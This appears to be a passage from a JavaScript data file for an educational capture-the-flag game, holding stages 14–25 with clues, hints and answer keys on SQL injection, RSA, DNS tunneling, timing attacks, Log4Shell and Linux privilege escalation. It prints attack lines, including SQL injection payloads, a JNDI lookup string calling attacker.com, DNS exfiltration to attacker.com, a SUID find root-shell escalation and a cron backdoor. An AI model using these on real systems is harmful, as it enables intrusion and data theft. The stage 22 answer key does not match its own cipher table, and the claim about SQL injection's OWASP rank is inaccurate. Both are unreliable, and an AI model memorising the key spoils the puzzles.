Rule: compare each adjacent pair. If left > right, swap them.
Make one complete left-to-right pass through all pairs.

What does the array look like after this single pass?

Submit numbers comma-separated.`,
        answer: norm("34,25,12,22,11,64,90"),
        hint: "Work through every adjacent pair: (64,34), (64,25), (64,12), (64,22), (64,11), (64,90). Swap when the left is bigger."
      },
      {
        id: 5,
        text: `FINAL SEAL — STAGE 14

Binary search: O(log n)
Bubble sort (worst case): O(n²)

On one million elements:
  Binary search: ~20 operations
  Bubble sort: ~1,000,000,000,000 operations

The right algorithm is not just faster. It's the difference
between possible and impossible.

FLAG{BINARY_WORD_WORD}`,
        answer: norm("flag{binary_search_wins}"),
        hint: "Binary search always beats linear search on sorted data. What does it do to linear search every time they compete?"
      }
    ]
  },

  {
    id: 15, name: "The Pseudocode Oracle", tier: "TIER III — RESTRICTED SECTION",
    flag: makeFlag("TRACE_THE_CODE"),
    clues: [
      {
        id: 1,
        text: `Trace this code exactly. What single word does it print?

  x = 5
  y = 3
  z = x * y + x
  IF z > 25:
    PRINT "high"
  ELSE IF z > 15:
    PRINT "medium"
  ELSE:
    PRINT "low"`,
        answer: norm("medium"),
        hint: "Calculate z first. Then check each condition in order — which one is the first to be true?"
      },
      {
        id: 2,
        text: `Trace this loop. What number does it print?

  result = 1
  n = 1
  WHILE n <= 5:
    result = result * n
    n = n + 1
  PRINT result`,
        answer: norm("120"),
        hint: "Track both 'result' and 'n' through each iteration. Write down the value of result after each multiplication."
      },
      {
        id: 3,
        text: `Trace the recursive function. What number does it print?

  function mystery(n):
    if n == 0: return 1
    return n * mystery(n - 1)

  PRINT mystery(6)`,
        answer: norm("720"),
        hint: "Expand the recursion: mystery(6) = 6 × mystery(5) = 6 × 5 × mystery(4) = ... Keep going until you hit the base case."
      },
      {
        id: 4,
        text: `This function has a bug. Find it.

  function findMax(arr):
    max = 0
    FOR each value IN arr:
      IF value > max:
        max = value
    RETURN max

  PRINT findMax([-5, -3, -8, -1])

What does the buggy function actually return?
What should it correctly return?

Submit as: actual_return:correct_return`,
        answer: norm("0:-1"),
        hint: "What is max initialised to? Can any value in the input array ever be greater than that starting value? What does that mean for the output?"
      },
      {
        id: 5,
        text: `FINAL SEAL — STAGE 15

Reading code and predicting its output — without executing it —
is called code tracing or dry running.

It's how engineers debug unfamiliar code,
review others' work, and catch bugs before they ship.

The flag: two words describing this fundamental skill.

FLAG{TRACE_THE_WORD}`,
        answer: norm("flag{trace_the_code}"),
        hint: "The verb is TRACE. You trace ___. What is the thing you traced through in every clue this stage?"
      }
    ]
  },

  /* ═══════════════════════════════════════════
     TIER IV — DEEP ARCHIVE (Stages 16–20)
     SQL injection, RSA math, DNS internals,
     timing attacks, layered crypto.
     Hints become nudges, not solutions.
     ═══════════════════════════════════════════ */

  {
    id: 16, name: "The Injection Point", tier: "TIER IV — DEEP ARCHIVE",
    flag: makeFlag("INPUT_IS_THE_ENEMY"),
    clues: [
      {
        id: 1,
        text: `SQL injection occurs when user input is treated as SQL code.

A login query:
  SELECT * FROM users
  WHERE username = '{input}' AND password = '{pass}'

An attacker enters this as their username:  admin' --

In SQL, -- starts a comment. Everything after it is ignored.

Write the exact query that actually executes after this injection.
(Omit anything that becomes a comment.)`,
        answer: norm("select * from users where username = 'admin'"),
        hint: "Place the attacker's input into the query template, then apply the comment rule. What's left running?"
      },
      {
        id: 2,
        text: `UNION injection appends results from a second query.

Original query (returns 2 columns — name, price):
  SELECT name, price FROM products WHERE id = {id}

Attacker enters as id:
  1 UNION SELECT username, password FROM users --

For UNION to work, both SELECT statements must return the same number of columns.
Original has 2. The injected SELECT also has 2.

What data does the attacker get back in the response?`,
        answer: norm("usernames and passwords"),
        hint: "The UNION merges results from two queries. The second query targets the users table with two specific columns."
      },
      {
        id: 3,
        text: `Blind SQL injection: the page shows no data, but responds differently
based on whether a condition is true or false.

  id = 1 AND 1=1  → page loads normally
  id = 1 AND 1=2  → page shows nothing

Attacker sends:
  id = 1 AND ASCII(SUBSTRING(password,1,1)) > 77

The page loads normally (TRUE response).

What has the attacker learned about the first character of the password?`,
        answer: norm("the first character has ascii value greater than 77"),
        hint: "The condition tested is: ASCII value of first character > 77. The page responded TRUE. What does that confirm about the character?"
      },
      {
        id: 4,
        text: `The correct defence is parameterized queries (prepared statements).

Vulnerable code:
  query = "SELECT * FROM users WHERE user = '" + input + "'"

Safe code:
  query = "SELECT * FROM users WHERE user = ?"
  database.execute(query, [input])

With the safe version, an attacker enters:  admin' --

What happens to the single quote and double-dash in the parameterized query?`,
        answer: norm("treated as literal data"),
        hint: "The database driver receives the query template and the input separately. It never combines them as text. How does it interpret the input?"
      },
      {
        id: 5,
        text: `FINAL SEAL — STAGE 16

SQL injection has ranked #1 on the OWASP Top 10 vulnerability list
for over two decades.

Every incident traces back to the same root cause:
the application trusted data that came from outside.

The security mindset: all user input is ___

FLAG{INPUT_IS_THE_WORD}`,
        answer: norm("flag{input_is_the_enemy}"),
        hint: "What is user input to a security engineer? Not a friend. Not neutral. What is it?"
      }
    ]
  },

  {
    id: 17, name: "The RSA Room", tier: "TIER IV — DEEP ARCHIVE",
    flag: makeFlag("PRIME_FACTORING_HARD"),
    clues: [
      {
        id: 1,
        text: `RSA key generation starts with two prime numbers.

Step 1: Choose primes p = 11 and q = 13.
Step 2: Compute the modulus n = p × q.

What is n?`,
        answer: norm("143"),
        hint: "Multiply the two primes directly."
      },
      {
        id: 2,
        text: `Step 3: Compute Euler's totient function φ(n).

For a product of two primes:
  φ(n) = (p − 1)(q − 1)

Using p=11 and q=13, compute φ(143).`,
        answer: norm("120"),
        hint: "Subtract 1 from each prime, then multiply the results."
      },
      {
        id: 3,
        text: `Step 4: Choose a public exponent e.

Requirements for e:
  • 1 < e < φ(n)  →  1 < e < 120
  • gcd(e, φ(n)) = 1  →  e and 120 share no common factors

From this list, select all VALID values of e:
  7, 11, 12, 17, 20

Submit valid values comma-separated.`,
        answer: norm("7,11,17"),
        hint: "Find the GCD of each candidate with 120. If they share any factor > 1, they're invalid. 12 and 20 both share factors with 120."
      },
      {
        id: 4,
        text: `Step 5: Select e = 7. Find the private exponent d.

The condition is: (d × e) mod φ(n) = 1
That means: (d × 7) mod 120 = 1

A candidate value is d = 103.

Verify: compute (103 × 7) mod 120.

What is the result?`,
        answer: norm("1"),
        hint: "Multiply 103 × 7 first. Then find the remainder when that product is divided by 120."
      },
      {
        id: 5,
        text: `FINAL SEAL — STAGE 17

RSA is built on one asymmetry:
  Multiplying two primes together = trivial
  Factoring the product back into the two primes = computationally infeasible for large numbers

Your modulus was 143. Its factors (11 and 13) were easy to find.
RSA uses numbers with thousands of digits. Factoring those could take longer than the universe has existed.

The flag names this mathematical hard problem.

FLAG{PRIME_WORD_WORD}`,
        answer: norm("flag{prime_factoring_hard}"),
        hint: "What operation on a product of large primes is RSA's security based upon being computationally difficult?"
      }
    ]
  },

  {
    id: 18, name: "The DNS Tunnel", tier: "TIER IV — DEEP ARCHIVE",
    flag: makeFlag("DNS_LEAKS_EVERYTHING"),
    clues: [
      {
        id: 1,
        text: `DNS translates human-readable domain names to IP addresses.

When you query "archive.internal", the process is:
  1. Check local resolver cache
  2. Ask your configured DNS server
  3. That server queries Root servers (.)
  4. Then TLD servers (.internal)
  5. Then authoritative servers for archive.internal

The DNS server does all this querying on your behalf.
This pattern — where one party performs all lookups for another — has a name.

What type of DNS resolution is this?`,
        answer: norm("recursive"),
        hint: "The resolver goes back repeatedly, asking each level in turn. What word describes a process that calls itself or loops through levels?"
      },
      {
        id: 2,
        text: `DNS TXT records can hold arbitrary text.
They're used for many purposes — one is preventing email spoofing.

A company's DNS contains:
  TXT  "v=spf1 include:mailprovider.com ~all"

The v=spf1 prefix is the identifier for a specific email authentication standard.

What three-letter abbreviation does v=spf1 stand for?`,
        answer: norm("spf"),
        hint: "The prefix is literally the abbreviation with '1' for version. What three letters are before the '1'?"
      },
      {
        id: 3,
        text: `DNS tunneling is an exfiltration technique.

A corporate firewall blocks all outbound traffic except DNS.
An attacker inside the network encodes stolen data into DNS query subdomains:

  aGVsbG8=.exfil.attacker.com  →  lookup sent to attacker's DNS server
  d29ybGQ=.exfil.attacker.com  →  next chunk

The attacker controls attacker.com's DNS server and receives all queries.

Decode the first subdomain label:
  aGVsbG8=`,
        answer: norm("hello"),
        hint: "The subdomain looks like it uses a familiar encoding from Stage 7."
      },
      {
        id: 4,
        text: `DNS cache poisoning tricks a DNS resolver into caching a false record.

Legitimate:  bank.com → 203.0.113.10
Poisoned:    bank.com → 198.51.100.99 (attacker server)

DNSSEC was created to prevent this by adding cryptographic signatures to DNS records.

What does the word "DNSSEC" stand for?
(DNS Security ___)`,
        answer: norm("extensions"),
        hint: "DNSSEC adds something to the DNS standard. What word means additions or additions to a specification?"
      },
      {
        id: 5,
        text: `FINAL SEAL — STAGE 18

Most organisations monitor HTTP and SMTP traffic carefully.
But DNS is often left unmonitored and unencrypted.

Every domain a user visits creates a DNS query.
Internal hostnames appear in DNS logs.
Data can be tunneled out as shown in clue 3.

A network defender who finally enables DNS logging
always says the same thing.

The flag: what DNS logs reveal.

FLAG{DNS_WORD_WORD}`,
        answer: norm("flag{dns_leaks_everything}"),
        hint: "When you finally start logging DNS traffic on a network, you discover it reveals far more than expected. DNS ___ ___."
      }
    ]
  },

  {
    id: 19, name: "The Timing Attack", tier: "TIER IV — DEEP ARCHIVE",
    flag: makeFlag("TIME_IS_A_SIDE_CHANNEL"),
    clues: [
      {
        id: 1,
        text: `This password comparison function has a vulnerability:

  function checkPassword(input, stored):
    for i from 0 to len(input)-1:
      if input[i] != stored[i]:
        return FALSE        // exits immediately on first mismatch
    return TRUE

Stored password: "secretXYZ"

An attacker tries two inputs:
  Input A: "aaaaaaXYZ"
  Input B: "secretabc"

One input causes the function to run significantly longer.
Which one, and why does it take longer?

Submit just the input that takes longer.`,
        answer: norm("secretabc"),
        hint: "The function exits as soon as it finds a mismatch. Which input matches more characters before failing?"
      },
      {
        id: 2,
        text: `The attacker uses the timing difference to guess the password
one character at a time.

For an 8-character password using the 26 lowercase letters:
  Standard brute force: try all possible 8-character combinations
  Timing attack: guess each character position independently

With the timing attack, an attacker tries at most 26 guesses per position.

What is the TOTAL maximum number of guesses needed
to find an 8-character password using the timing attack?`,
        answer: norm("208"),
        hint: "Each position is guessed independently. 26 possible letters × 8 positions."
      },
      {
        id: 3,
        text: `The constant-time comparison fix:

  function safeCheck(input, stored):
    result = 0
    for i from 0 to MAX_LENGTH:
      result = result OR (input[i] XOR stored[i])
    return result == 0

Why does this prevent the timing attack?

Which option correctly describes this function's behaviour?

  A) It always runs for exactly MAX_LENGTH iterations, regardless of matches or mismatches
  B) It exits early when a mismatch is found, just like the vulnerable version
  C) It only compares the first character to save time`,
        answer: norm("a"),
        hint: "Look at the loop. Is there any early exit? Does it have a break or return inside the loop body?"
      },
      {
        id: 4,
        text: `Spectre (CVE-2017-5753) is a side-channel attack that affected
nearly every CPU manufactured in the last 20 years.

It works by exploiting speculative execution —
the CPU pre-runs code along predicted branches,
leaving measurable traces of secret data behind.

Those traces appear in which CPU subsystem?

  A) Power management unit
  B) CPU cache
  C) Network interface
  D) Hard disk controller`,
        answer: norm("b"),
        hint: "Speculative execution touches memory. When it does, that memory gets copied into a fast temporary storage area. Measuring access times to that area reveals secrets."
      },
      {
        id: 5,
        text: `FINAL SEAL — STAGE 19

Side-channel attacks break systems not through logical flaws
but through physical measurements:
  how long something takes,
  how much power it draws,
  what it leaves in CPU cache.

Even a mathematically perfect algorithm can leak its secrets
through the physical world of its implementation.

The flag names what time is, in security terms.

FLAG{TIME_IS_A_WORD_WORD}`,
        answer: norm("flag{time_is_a_side_channel}"),
        hint: "Time is not just a measurement — in security, it's a channel through which information leaks. What do we call such a channel?"
      }
    ]
  },

  {
    id: 20, name: "The Cipher Chain", tier: "TIER IV — DEEP ARCHIVE",
    flag: makeFlag("CHAINED_CIPHERS_FALL"),
    clues: [
      {
        id: 1,
        text: `A message was encrypted in three layers.
Peel them from the outside in.

Layer 3 (outermost) is Base64.

Decode this string using your browser console:
  Y2hhaW5lZA==

What word does it decode to?`,
        answer: norm("chained"),
        hint: "atob() in browser console or base64 -d in a terminal."
      },
      {
        id: 2,
        text: `Layer 2 is ROT13 — each letter is shifted 13 places in the alphabet.

Applying ROT13 to any text, then applying it again, returns the original.

Decode:  PVCUREF`,
        answer: norm("ciphers"),
        hint: "ROT13: each letter maps to the one 13 positions ahead of it in the alphabet, wrapping around. A→N, B→O, ... P→C..."
      },
      {
        id: 3,
        text: `Layer 1 (innermost) is XOR encryption with key byte 42.

To decrypt: XOR each byte with 42.

Ciphertext decimal values: 110  75  107  107

You know how XOR works from Stage 4.

Decrypt each byte and find the ASCII character.
What four-letter word do they form?`,
        answer: norm("fall"),
        hint: "Convert each decimal to binary, XOR with 42 (00101010), convert back to decimal, then to ASCII. The word is short and common."
      },
      {
        id: 4,
        text: `You decoded the three layers:
  Layer 3 (Base64):  from clue 1
  Layer 2 (ROT13):   from clue 2
  Layer 1 (XOR):     from clue 3

Stacking weak ciphers doesn't create strong encryption.
If each layer can be broken independently, the combination is just as weak.

In mathematics, when two functions f and g are combined
such that g(f(x)) forms a single equivalent function, this is called:

f and g form a function ___`,
        answer: norm("composition"),
        hint: "When you apply one function's output as another function's input, the combined operation has a specific mathematical name."
      },
      {
        id: 5,
        text: `FINAL SEAL — STAGE 20

The three words you decoded from the three cipher layers.

Arrange them in order from outermost (clue 1) to innermost (clue 3).

That three-word sequence is your flag.

FLAG{WORD_WORD_WORD}`,
        answer: norm("flag{chained_ciphers_fall}"),
        hint: "Layer 3, then Layer 2, then Layer 1 — in that sequence."
      }
    ]
  },

  /* ═══════════════════════════════════════════
     TIER V — THE VAULT (Stages 21–25)
     Hints are minimal. Clues require synthesis.
     No step-by-step guidance.
     ═══════════════════════════════════════════ */

  {
    id: 21, name: "The Zero Day", tier: "TIER V — THE VAULT",
    flag: makeFlag("EXPLOIT_THEN_PATCH"),
    clues: [
      {
        id: 1,
        text: `In December 2021, a critical vulnerability was discovered
in Apache Log4j — a logging library used by millions of Java applications.

An attacker could trigger it by getting a target system to log this string:

  ${'{'}jndi:ldap://attacker.com/exploit{'}'}

When Log4j logged this message, it resolved the JNDI lookup,
connected to the attacker's server, and executed the returned code.

What three-word term (abbreviated RCE) describes the category of attack
where an attacker runs arbitrary code on a remote machine?`,
        answer: norm("remote code execution"),
        hint: "The abbreviation is RCE. Expand each letter into a word."
      },
      {
        id: 2,
        text: `Patch lag is the window of time between when an exploit is available
and when organisations actually apply the fix.

Industry research shows:
  Average time from CVE publication to first exploit in the wild: 15 days
  Average time for organisations to patch critical CVEs: 60 days

During this gap, systems are exposed to known, weaponised exploits.

How many days long is this exposure window?`,
        answer: norm("45"),
        hint: "The gap is between when exploits appear and when patching completes."
      },
      {
        id: 3,
        text: `When a security researcher finds a vulnerability, they face a choice:

Option A: Publish immediately (giving attackers the information)
Option B: Notify the vendor privately first, give them time to fix it,
           then publish after the fix is available.

Option B is the industry standard, governed by a 90-day timeline
(pioneered by Google's Project Zero team).

What two-word term describes Option B?`,
        answer: norm("responsible disclosure"),
        hint: "The second word is 'disclosure'. What adjective describes the ethical, careful approach to sharing vulnerability information?"
      },
      {
        id: 4,
        text: `CVSS (Common Vulnerability Scoring System) rates vulnerability severity from 0.0 to 10.0.

  0.1–3.9   = Low
  4.0–6.9   = Medium
  7.0–8.9   = High
  9.0–10.0  = Critical

Log4Shell received a CVSS score of 10.0 — the maximum possible.

What one-word severity level does 10.0 represent?`,
        answer: norm("critical"),
        hint: "Look at the ranges. 10.0 falls in the highest band."
      },
      {
        id: 5,
        text: `FINAL SEAL — STAGE 21

Ethical security researchers don't just find vulnerabilities.
They prove the vulnerability is real by demonstrating it in a controlled environment.
Then they report it. Then they wait for the fix.

The two actions that define the ethical researcher's workflow —
the first (proving it real) and the last (applying the solution) —
form your flag.

FLAG{WORD_THEN_WORD}`,
        answer: norm("flag{exploit_then_patch}"),
        hint: "What verb means 'to demonstrate a working attack'? What is the action that fixes the vulnerability?"
      }
    ]
  },

  {
    id: 22, name: "The Cryptographer's Gauntlet", tier: "TIER V — THE VAULT",
    flag: makeFlag("MATH_BREAKS_CIPHERS"),
    clues: [
      {
        id: 1,
        text: `Frequency analysis breaks simple substitution ciphers.

English letter frequencies (most to least common, top 5):
  E=12.7%  T=9.1%  A=8.2%  O=7.5%  I=7.0%

In an intercepted ciphertext, symbol frequencies were measured:
  ◆=14.2%  ●=9.0%  ▲=8.1%  ★=7.4%  ✦=6.9%

Assuming a simple substitution (each cipher symbol = one English letter),
map the top 3 most-frequent cipher symbols to the top 3 most-frequent English letters.

Submit as three plaintext letters, comma-separated, in frequency rank order.`,
        answer: norm("e,t,a"),
        hint: "The most frequent cipher symbol maps to the most frequent English letter, and so on down the ranking."
      },
      {
        id: 2,
        text: `Using the established cipher alphabet:
  ◆=E  ●=T  ▲=A  ★=O  ✦=I  ✧=S  ♠=N  ♣=R

Decode this ciphertext:

  ●♣▲◆  ●♠◆  ♠◆●♣★✦♠`,
        answer: norm("trace the neutron"),
        hint: "Map each symbol to its letter using the provided cipher alphabet. Spaces separate words."
      },
      {
        id: 3,
        text: `The Vigenère cipher defeated frequency analysis for centuries
because each letter in the keyword shifts a different plaintext position by a different amount.

The Kasiski examination finds repeated ciphertext sequences
and measures the distances between them.
If the keyword has length k, repeated sequences will appear at intervals that are multiples of k.

A repeated 3-gram "XYZ" appears at positions 5 and 20.
Distance = 15.
Factors of 15: 1, 3, 5, 15.

The keyword length is most likely which factor?
(Eliminate 1 as trivial. Which remaining factor is most likely for a typical keyword?)`,
        answer: norm("3"),
        hint: "Short keywords are more likely than long ones. Between the non-trivial factors, which is shortest?"
      },
      {
        id: 4,
        text: `Diffie-Hellman allows two parties to create a shared secret over a public channel.

Public parameters: generator g=2, prime p=11
Alice's private key: a=3
Bob's private key:   b=4

Alice computes and sends: A = g^a mod p = 2³ mod 11 = 8
Bob computes and sends:   B = g^b mod p = 2⁴ mod 11 = ?

Compute 2⁴ mod 11.`,
        answer: norm("5"),
        hint: "Compute 2 to the power of 4, then find the remainder when divided by 11."
      },
      {
        id: 5,
        text: `FINAL SEAL — STAGE 22

Every cipher in history eventually fell — not to brute force, but to mathematics.

Frequency analysis broke Caesar and simple substitution.
Kasiski and Index of Coincidence broke Vigenère.
Shor's quantum algorithm will eventually break RSA.

No cipher designed by humans has ever been permanently secure.

The flag: what mathematics ultimately does to all ciphers.

FLAG{MATH_WORD_WORD}`,
        answer: norm("flag{math_breaks_ciphers}"),
        hint: "What does mathematics do to every cipher that has ever been designed? Two words."
      }
    ]
  },

  {
    id: 23, name: "The Shell Session", tier: "TIER V — THE VAULT",
    flag: makeFlag("ROOT_IS_THE_GOAL"),
    clues: [
      {
        id: 1,
        text: `A penetration tester gains a shell on a Linux machine and runs:

  id

Output:
  uid=1001(webuser) groups=1001(webuser)

The tester is not the most privileged user.
The most privileged Linux account has a specific numeric user ID.

What is that numeric UID?`,
        answer: norm("0"),
        hint: "Every Linux system has exactly one superuser account. Its UID is the same on every system — the very first number."
      },
      {
        id: 2,
        text: `The tester looks for SUID binaries — executables that run with their owner's permissions
regardless of who executes them.

Command: find / -perm -4000 -type f 2>/dev/null

Output includes:
  /usr/bin/passwd
  /usr/bin/sudo
  /usr/bin/find

The 'find' binary is SUID root — this is unusual and exploitable.
Running find with the -exec flag executes a command as root.

If a tester runs:
  find . -exec /bin/sh -p \; -quit

What privilege level does the resulting shell have?`,
        answer: norm("root"),
        hint: "SUID means the binary runs as its owner. /usr/bin/find is owned by root and has SUID set. When it executes /bin/sh..."
      },
      {
        id: 3,
        text: `With root access, the tester reads /etc/shadow.

An entry looks like:
  admin:$6$xyz123$AbCdEfGhIjKlMnOpQrStUvWxYz0123456789abcdefgh:19000:0:99999:7:::

The $6$ identifies the password hashing algorithm used.

Hash type identifiers:
  $1$  = MD5
  $2a$ / $2b$ = bcrypt
  $5$  = SHA-256
  $6$  = ?

What algorithm does $6$ indicate?`,
        answer: norm("sha-512"),
        hint: "SHA comes in several variants. $5$ is SHA-256. $6$ is the next stronger variant."
      },
      {
        id: 4,
        text: `The tester sets up persistence using a cron job.

Cron syntax: [minute] [hour] [day] [month] [weekday] [command]
  * means "every" value in that field
  */5 means "every 5th" value

Cron entry:
  */5 * * * * /tmp/backdoor.sh

How frequently does /tmp/backdoor.sh execute?`,
        answer: norm("every 5 minutes"),
        hint: "*/5 in the minutes field means every 5 minutes. The remaining fields are all *, meaning any hour, any day."
      },
      {
        id: 5,
        text: `FINAL SEAL — STAGE 23

Post-exploitation is the phase after gaining initial access.
The primary objective: escalate from a low-privilege account
to the system's most powerful account.

Everything in this stage pointed toward one target.

The flag: what that target is.

FLAG{WORD_IS_THE_WORD}`,
        answer: norm("flag{root_is_the_goal}"),
        hint: "What is the name of the account that uid=0 represents? That's what every pentester is trying to reach."
      }
    ]
  },

  {
    id: 24, name: "The Protocol Dissector", tier: "TIER V — THE VAULT",
    flag: makeFlag("PACKETS_TELL_STORIES"),
    clues: [
      {
        id: 1,
        text: `A raw TCP packet header, shown in hexadecimal:

  00 50        ← Source port
  01 BB        ← Destination port
  00 00 04 D2  ← Sequence number
  00 00 00 00  ← Acknowledgment number
  60 02        ← Data offset + flags
  FF FF        ← Window size

Convert the source port (00 50) and destination port (01 BB)
from hexadecimal to decimal.

Submit as: srcport:dstport`,
        answer: norm("80:443"),
        hint: "Each port is a two-byte hex value. Treat them as base-16 numbers and convert. Do you recognise these port numbers from Stage 8?"
      },
      {
        id: 2,
        text: `TCP uses a flags byte to indicate connection state.

Flag bit positions (from LSB to MSB):
  Bit 0 = 0x01 = FIN
  Bit 1 = 0x02 = SYN
  Bit 2 = 0x04 = RST
  Bit 3 = 0x08 = PSH
  Bit 4 = 0x10 = ACK
  Bit 5 = 0x20 = URG

A captured packet has flags byte: 0x12

Convert 0x12 to binary. Then check which bit positions are set (equal to 1).

Which two TCP flags are active in this packet?
Submit flag names comma-separated.`,
        answer: norm("syn,ack"),
        hint: "Convert 0x12 to binary first. Then map each set bit to its flag name using the table above."
      },
      {
        id: 3,
        text: `The sequence number field from the packet header: 00 00 04 D2

Convert this four-byte hexadecimal value to decimal.`,
        answer: norm("1234"),
        hint: "Ignore the leading zeros. Focus on 04 D2. Each hex digit is worth 16× the position to its right."
      },
      {
        id: 4,
        text: `The packet's payload is hex-encoded. Convert to ASCII first, then decode:

  59 32 68 68 61 57 35 6C 5A 41 3D 3D

Step 1: Convert each hex byte to its ASCII character.
Step 2: The resulting ASCII string is Base64-encoded — decode it.

What word is in the final decoded payload?`,
        answer: norm("channel"),
        hint: "You're doing two conversions: hex → ASCII gives you a Base64 string, then Base64 → plaintext gives you the word. Use the tools from earlier stages."
      },
      {
        id: 5,
        text: `FINAL SEAL — STAGE 24

A skilled network analyst can reconstruct an entire conversation —
who connected to what, which service, what data was exchanged —
just by examining raw packet bytes.

Ports reveal services. Flags reveal connection state.
Sequence numbers reveal data flow. Payloads carry the truth.

The flag: what packets do for someone who knows how to read them.

FLAG{PACKETS_WORD_WORD}`,
        answer: norm("flag{packets_tell_stories}"),
        hint: "What does a packet capture do for a skilled analyst? It ___ stories — about connections, data, and behaviour."
      }
    ]
  },

  {
    id: 25, name: "The Final Seal", tier: "TIER V — THE VAULT",
    flag: makeFlag("ARCHIVE_UNLOCKED"),
    clues: [
      {
        id: 1,
        text: `THE FINAL STAGE.

Recall your work from Stage 1, Clue 3:
  You decoded hex bytes 42 49 54 53 to a four-letter word.

And from Stage 7, Clue 2:
  You decoded a Base64 string to a five-letter word.

XOR the ASCII value of the FIRST letter of each word together.

Submit the decimal result of that XOR operation.`,
        answer: norm("42"),
        hint: "Get both words from memory. Take only the first letter of each. Find their ASCII decimal values. XOR those two numbers using binary arithmetic."
      },
      {
        id: 2,
        text: `Recall your work from Stage 11, Clue 3:
  You identified a famous password from its MD5 hash.

And from Stage 17, Clue 4:
  You computed a modulo operation and got a single-digit result.

Take the ASCII value of the first letter of the Stage 11 password.
Subtract the Stage 17 result from it.

What is the final value?`,
        answer: norm("111"),
        hint: "Find the ASCII value of the first letter of that famous password. Subtract the small number you computed in Stage 17."
      },
      {
        id: 3,
        text: `Recall Stage 13, Clue 3:
  You encoded a modified JSON string using btoa() in the browser console.
  The result was a Base64 string.

Count the total number of characters in that Base64 output.
Include the = padding characters.

How many characters long is it?`,
        answer: norm("56"),
        hint: "Go back to Stage 13, Clue 3 and run the btoa() command again if needed. Count every character in the output including = signs."
      },
      {
        id: 4,
        text: `Combine your three results from this stage:

  Clue 1 result: XOR of two ASCII values
  Clue 2 result: ASCII subtraction
  Clue 3 result: character count

Compute: (clue_1 XOR clue_2) + clue_3

Perform the XOR operation first, then add.

Submit the final number.`,
        answer: norm("125"),
        hint: "Use the values you computed in clues 1, 2, and 3 of this stage. XOR the first two results together in binary, then add the third."
      },
      {
        id: 5,
        text: `FINAL SEAL — THE ARCHIVE COMPLETE

25 stages.
125 clues.

You decoded binary, hex, and Base64.
You traced logic circuits and call stacks.
You dissected TCP packets at the byte level.
You computed RSA components by hand.
You broke SQL injection and cookie tampering.
You peeled layered encryption.
You traced timing attacks and side channels.

The Archive is open.

FLAG{WORD_WORD}`,
        answer: norm("flag{archive_unlocked}"),
        hint: "What happens to an archive when someone with the skill and persistence to solve 124 clues arrives at the final door?"
      }
    ]
  }

];

function validateStages() {
  if (STAGES.length !== 25) throw new Error(`Expected 25 stages, got ${STAGES.length}`);
  STAGES.forEach((stage) => {
    if (stage.clues.length !== 5) throw new Error(`Stage ${stage.id} has ${stage.clues.length} clues`);
    if (!stage.flag) throw new Error(`Stage ${stage.id} missing flag`);
    stage.clues.forEach((clue) => {
      if (!clue.answer) throw new Error(`Stage ${stage.id} clue ${clue.id} missing answer`);
      if (!clue.hint) throw new Error(`Stage ${stage.id} clue ${clue.id} missing hint`);
    });
  });
  console.log(`[Archive] Validated: ${STAGES.length} stages, ${STAGES.length * 5} clues.`);
}

validateStages();

module.exports = { STAGES, norm };